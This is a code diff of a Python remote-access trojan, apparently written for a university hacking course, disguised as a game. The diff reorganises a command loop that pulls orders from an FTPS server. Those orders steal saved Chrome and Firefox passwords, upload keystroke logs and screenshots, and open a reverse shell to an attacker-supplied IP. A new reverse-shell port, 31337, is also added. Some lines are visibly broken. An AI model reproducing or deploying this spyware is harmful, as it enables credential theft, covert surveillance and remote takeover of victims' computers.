@@ -25,6 +25,7 @@ current_hwnd = 0
 screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
 screenshot_number = 3
 expression = ""
+port_reverse_shell = 31337
 
 #Functions
 #------------------------Normal/Fake Function (Game)------------------------
@@ -440,63 +441,57 @@ def main():
                 print("Connected to FTPS server! Debugging purpose, delete later!!")
             except:
                 time.sleep(20)
-                    
-            
-            #upload pictures and keylogger data to ftps server
-            if os.path.exists(str(get_path()) + "/keystrokes/"):
-                if count == 0:
-                    try:
-                        ftps.mkdir(os.environ.get("USERNAME"))
-                        count += 1
-                        ftps.chdir(os.environ.get('USERNAME'))
-                    except:
-                        pass
-                else: 
-                    ftps.chdir(os.environ.get('USERNAME'))
-                ftps_check_dir(ftps, "keystrokes")
-                ftps_upload_file(ftps, str(get_path()) + "keystrokes\\keylogger.txt")
-                ftps.chdir("..")
-            print("Uploaded keystrokes to FTPS server! Debugging purpose, delete later!!")
-            
-
-            if os.path.exists(str(get_path()) + "/screenshots/") :
-                if count == 0:
-                    try:
-                        ftps.mkdir(os.environ.get("USERNAME"))
-                        count += 1
-                        ftps.chdir(os.environ.get('USERNAME'))
-                    except:
-                        pass
-                ftps_check_dir(ftps, "screenshots")
-                n = 0
-                while screenshot_number > n:
-                    ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n) + ".png")
-                    n += 1
-                ftps.chdir("..")
             
         
             #check for commands from ftps server 
             try:
                 ftps_check_dir(ftps, "commands")
-                ftps_download_file(ftps, str(os.environ.get("USERNAME") + "/commands/command.txt"))
-                ftps.delete(str(os.environ.get("USERNAME") + "/commands/command.txt"))
-                ftps.cd("..")
-                ftps.cd("..")
-                with open(str(get_path()) + "./commands/command.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
+                ftps.get('command.txt', '', preserve_mtime=True)
+                with open("command.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
                     command = f.read()
+                    print("[+] the command is: " + command)
                     if command == "get passwords":
                         get_chrome_passwords()
                         get_firefox_passwords()
                         time.sleep(2)
                         ftps_upload_file(ftps, str(get_path()) + "/keystrokes/enc_dec.txt")
-                        ftps.delete(str(get_path()) + "/keystrokes/enc_dec.txt.txt")
+                        #locally delete the file after upload
+                        os.remove(str(get_path()) + "/keystrokes/enc_dec.txt")
+                    
                     elif command == "get screenshots":
+                        if os.path.exists(str(get_path()) + "/screenshots/") :
+                            if count == 0:
+                                try:
+                                    ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
+                                    count += 1
+                                    ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                                except:
+                                    pass
+                        ftps_check_dir(ftps, "screenshots")
                         n = 0
-                        while screenshot_number < n:
-                            ftps_upload_file(ftps, str(get_path()) + "/screenshots/program" + str(n) + ".png")
+                        while screenshot_number > n:
+                            ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n) + ".png")
                             n += 1
+                        ftps.chdir("..")
+                    
+               
                     elif command == "get keylogger":
-                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
+                        #upload pictures and keylogger data to ftps server
+                        if os.path.exists(str(get_path()) + "/keystrokes/"):
+                            if count == 0:
+                                try:
+                                    ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
+                                    count += 1
+                                    ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                                except:
+                                    pass
+                            else: 
+                                ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                            ftps_check_dir(ftps, "keystrokes")
+                            ftps_upload_file(ftps, str(get_path()) + "keystrokes\\keylogger.txt")
+                            ftps.chdir("..")
+                            print("Uploaded keystrokes to FTPS server! Debugging purpose, delete later!!")
+        
                         
                     #everything after here is jet to come
                     elif command == "get process":
@@ -504,19 +499,7 @@ def main():
                     elif command == "get systeminfo":
                         ftps_upload_file(ftps, str(get_path()) + "/systeminfo/systeminfo.txt")
                         
-                    #will most likely not work like this.. but idea is good
-                    elif command == "get reverse shell":
-                        ftps_download_file(ftps, str(get_path()) + "/reverse_shell/reverse_shell.txt")
-                        ftps.delete(str(get_path()) + "/reverse_shell/reverse_shell.txt")
-                        ftps.cd("..")
-                        ftps.cd("..")
-                        with open(str(get_path()) + "/reverse_shell/reverse_shell.txt", "r") as f:  #most likely wrong path
-                            ip = f.read()
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect((ip, 443))
-                            reverse_shell(s)
-                        
-                        #also great commands, lets implement them later on (thats why i added them..)
+                    #also great commands, lets implement them later on (thats why i added them..)
                     elif command == "get webcam":
                         ftps_upload_file(ftps, str(get_path()) + "/webcam/webcam.jpg")
                         ftps.delete(str(get_path()) + "/webcam/webcam.jpg")
@@ -525,6 +508,13 @@ def main():
                         ftps.delete(str(get_path()) + "/microphone/microphone.wav")
                     elif command == "get clipboard":
                         pass
+                    else:
+                        ip = command.split('')
+                        ip = ip[1]
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip, 443))
+                        reverse_shell(s)
+
             except:
                 print("No commands found on server!")
             
